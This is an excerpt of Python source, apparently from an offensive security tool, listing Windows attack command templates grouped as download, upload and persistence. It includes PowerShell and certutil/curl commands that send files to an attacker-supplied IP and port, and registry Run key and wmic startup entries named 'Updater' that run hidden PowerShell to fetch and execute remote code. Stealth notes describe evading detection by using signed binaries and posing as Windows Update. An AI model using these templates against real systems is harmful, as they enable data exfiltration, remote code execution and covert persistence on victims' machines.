...
WINDOWS_COMMANDS = {
    ...
    "download": [
        TechniqueEntry(
            ...
            stealth_note=(
                "certutil is a signed Microsoft binary (LOLBin). "
        ...
        TechniqueEntry(
            ...
            stealth_note=(
                "BITS is a legitimate Windows service used for Windows Update. "
        ...
        TechniqueEntry(
            ...
            stealth_note=(
                "Inline PowerShell avoids writing a .ps1 script to disk. "
        ...
        TechniqueEntry(
            ...
            stealth_note=(
                "Native curl.exe ships with Windows 10/11. "
        ...
        TechniqueEntry(
            ...
            stealth_note=(
                "regsvr32 is a signed Windows binary that can load COM objects "
    ...
    "upload": [
        TechniqueEntry(
            ...
            binary="powershell",
            template=(
                "powershell -c \"Invoke-WebRequest -Uri http://{ip}:{port}/upload "
                "-Method POST -InFile '$env:TEMP\\{filename}'\""
            ),
            stealth_note=(
                "Outbound HTTP POST to a custom port. "
        ...
        TechniqueEntry(
            ...
            binary="certutil",
            template=(
                'certutil -encode %TEMP%\\{filename} %TEMP%\\{filename}.b64 '
                '&& curl -X PUT http://{ip}:{port}/{filename}.b64 '
    ...
    "persistence": [
        TechniqueEntry(
            ...
            template=(
                ...
                '/v Updater /t REG_SZ /d "powershell -w hidden -c '
                "(New-Object Net.WebClient).DownloadString("
                "'http://{ip}:{port}/{filename}') | IEX\" /f"
            ),
            stealth_note=(
        ...
        TechniqueEntry(
            ...
            stealth_note=(
                "Task named 'WindowsUpdate' blends with legitimate tasks. "
        ...
        TechniqueEntry(
            ...
            binary="wmic",
            template=(
                'wmic startup call create "powershell -w hidden -ep bypass '
                "-c IEX(New-Object Net.WebClient).DownloadString("
                "'http://{ip}:{port}/{filename}')\", \"Updater\""
            ),
            stealth_note=(
